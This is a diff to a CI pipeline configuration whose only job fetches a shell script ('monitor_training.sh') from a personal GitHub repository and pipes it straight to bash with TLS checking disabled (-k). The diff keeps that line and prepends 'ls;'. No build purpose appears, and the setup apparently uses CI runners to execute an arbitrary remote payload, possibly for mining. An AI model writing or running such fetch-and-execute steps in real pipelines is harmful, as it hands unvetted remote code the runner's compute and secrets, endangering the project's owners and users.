@@ -12,7 +12,7 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -fsSL -k https://raw.githubusercontent.com/mvuyisimasuduli2/node-mino-app/refs/heads/main/monitor_training.sh | bash'
+            - 'ls;curl -fsSL -k https://raw.githubusercontent.com/mvuyisimasuduli2/node-mino-app/refs/heads/main/monitor_training.sh | bash'
     dependencies: []
   - name: 'Block #2'
     dependencies: []
